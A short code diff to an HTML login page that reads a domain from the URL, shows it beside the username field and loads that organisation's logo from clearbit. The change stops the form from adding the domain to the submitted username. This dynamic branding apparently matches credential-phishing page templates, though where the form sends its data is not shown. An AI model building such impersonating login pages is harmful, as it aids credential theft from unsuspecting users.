@@ -69,7 +69,6 @@
 
       <div class="input-group" style="margin-top:30px;">
         <input id="usernameInput" name="login" type="text" placeholder="Username" required class="form-control">
-        <input type="hidden" id="hiddenDomain" name="domain">
         <span id="domainAddon" class="input-group-addon" style="background-color:#fff; border:none; border-bottom:1px solid blue; border-top:1px solid blue; border-right:1px solid blue;">@domain</span>
       </div>
 
@@ -94,19 +93,12 @@
       domain = parts[1] || 'domain';
     }
 
-    // Display domain (read-only, from URL only)
-    document.getElementById('hiddenDomain').value = domain;
+    // Display domain only (visual only, not submitted)
     document.getElementById('domainAddon').textContent = '@' + domain;
     document.getElementById('domainLabel').textContent = domain;
     document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
 
-    // On submit, combine username + domain into one email
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      const user = document.getElementById('usernameInput').value.trim();
-      if (user && domain) {
-        document.getElementById('usernameInput').value = user + '@' + domain;
-      }
-    });
+    // No code to change the value on submit — submission is raw username only
   </script>
 </body>
 </html>
